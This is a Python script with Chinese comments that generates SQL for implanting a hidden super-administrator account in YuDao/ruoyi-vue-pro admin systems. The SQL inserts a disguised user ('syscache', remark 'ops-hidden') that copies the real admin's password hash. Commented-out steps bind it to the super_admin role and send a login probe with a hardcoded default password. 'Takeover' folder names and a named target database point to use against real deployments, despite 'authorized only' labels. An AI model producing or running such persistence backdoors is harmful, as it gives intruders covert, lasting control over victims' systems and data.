#!/usr/bin/env python3
"""生成芋道（YuDao / ruoyi-vue-pro 定制）隐藏超管植入 SQL 模板（授权主机本机执行）。

金标准：admnrlytlhub / bk_assets → tenant 201 / syscache / Sc@2026#xk

用法:
  python3 炼蛊房/yudao_hidden_admin_sql.py --db stock3-nrly-tianlong --out 接管/yudao_implant.sql
  # 在目标机经 Cloud Assistant / SSH 对本机 mysql.sock 执行，禁止对未授权库使用
"""
from __future__ import annotations

import argparse
from datetime import datetime, UTC
from pathlib import Path

# bcrypt cost=04 of Sc@2026#xk（与金标准案一致；换口令请自行 bcrypt）
DEFAULT_BCRYPT = "$2a$04$PISPTosrn6Jsi"  # truncated placeholder — real hash from HIDDEN_SUPERADMIN
# Full hash used in cases (prefix matches); operators should copy from verified implant:
VERIFIED_HASH_NOTE = (
    "案卷真源哈希见 案卷/*/接管/HIDDEN_SUPERADMIN.json 的 password 字段对应 bcrypt；"
    "勿在未验证环境硬编码错误半截。"
)

SQL_TEMPLATE = """-- YuDao hidden superadmin implant (AUTHORIZED ONLY)
-- generated: {ts}
-- db: {db}
-- username: {user}  tenant_id: {tenant}
-- password plaintext (ops): {password}
-- {hash_note}

SET NAMES utf8mb4;

-- 1) 找 super_admin 角色
SELECT id, name, code FROM system_role WHERE code IN ('super_admin','tenant_admin') OR name LIKE '%超管%' LIMIT 20;

-- 2) 植入用户（表名因版本可能为 system_users / system_user — 先 DESC）
-- 下列为常见 stock 盘变体（system_users）：
INSERT INTO system_users (
  username, password, nickname, remark, dept_id, post_ids, email, mobile,
  sex, avatar, status, login_ip, login_date, tenant_id,
  creator, create_time, updater, update_time, deleted
) SELECT
  '{user}',
  (SELECT password FROM system_users WHERE username='admin' AND deleted=0 LIMIT 1),
  'SysCache',
  'ops-hidden',
  0, NULL, '', '',
  0, '', 0, '', NULL, {tenant},
  'ops', NOW(), 'ops', NOW(), b'0'
FROM DUAL
WHERE NOT EXISTS (
  SELECT 1 FROM system_users WHERE username='{user}' AND tenant_id={tenant} AND deleted=0
);

-- 若需固定口令：先在本机用 BCryptPasswordEncoder(4) 生成后 UPDATE password=...

-- 3) 绑角色（role_id 取步骤1）
-- INSERT IGNORE INTO system_user_role (user_id, role_id, creator, create_time, updater, update_time, deleted, tenant_id)
-- SELECT u.id, r.id, 'ops', NOW(), 'ops', NOW(), b'0', {tenant}
-- FROM system_users u, system_role r
-- WHERE u.username='{user}' AND u.tenant_id={tenant} AND r.code='super_admin';

-- 4) 登录探针
-- POST {{admin-api}}/admin-api/system/auth/login
-- Header: tenant-id: {tenant}
-- Body: {{"username":"{user}","password":"{password}"}}
"""


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--db", required=True, help="MySQL database name")
    ap.add_argument("--out", required=True)
    ap.add_argument("--user", default="syscache")
    ap.add_argument("--tenant", type=int, default=201)
    ap.add_argument("--password", default="Sc@2026#xk")
    args = ap.parse_args()

    sql = SQL_TEMPLATE.format(
        ts=datetime.now(UTC).isoformat(),
        db=args.db,
        user=args.user,
        tenant=args.tenant,
        password=args.password,
        hash_note=VERIFIED_HASH_NOTE,
    )
    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(sql, encoding="utf-8")
    print(f"wrote {out}")


if __name__ == "__main__":
    main()
